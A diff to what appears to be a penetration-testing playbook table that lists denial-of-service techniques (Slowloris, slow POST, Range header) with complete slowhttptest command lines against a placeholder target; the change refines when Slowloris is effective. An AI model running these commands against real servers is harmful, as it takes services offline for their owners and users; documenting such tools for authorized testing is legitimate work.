@@ -121,7 +121,7 @@ Each row specifies the **best tool** for that vector — NOT a fallback chain.
 
 | Technique | Command | When to use |
 |-----------|---------|------------|
-| Slowloris (incomplete headers) | `slowhttptest -c {dos_connections} -H -g -o /tmp/dos_stats -i 10 -r 200 -t GET -l {dos_max_duration} -u http://<target>` | Default for any HTTP server |
+| Slowloris (incomplete headers) | `slowhttptest -c {dos_connections} -H -g -o /tmp/dos_stats -i 10 -r 200 -t GET -l {dos_max_duration} -u http://<target>` | Thread/connection-per-request servers (classic Apache prefork). INEFFECTIVE against nginx, event-driven servers, and anything behind a CDN/LB (Cloudflare, ALB) — fingerprint the server first |
 | Slow POST body (R.U.D.Y.) | `slowhttptest -c {dos_connections} -B -g -o /tmp/dos_stats -i 110 -r 200 -t POST -l {dos_max_duration} -u http://<target>` | POST-heavy apps (forms, APIs) |
 | Range header | `slowhttptest -c {dos_connections} -R -g -o /tmp/dos_stats -i 10 -r 200 -t GET -l {dos_max_duration} -u http://<target>` | Apache with Range support |
 
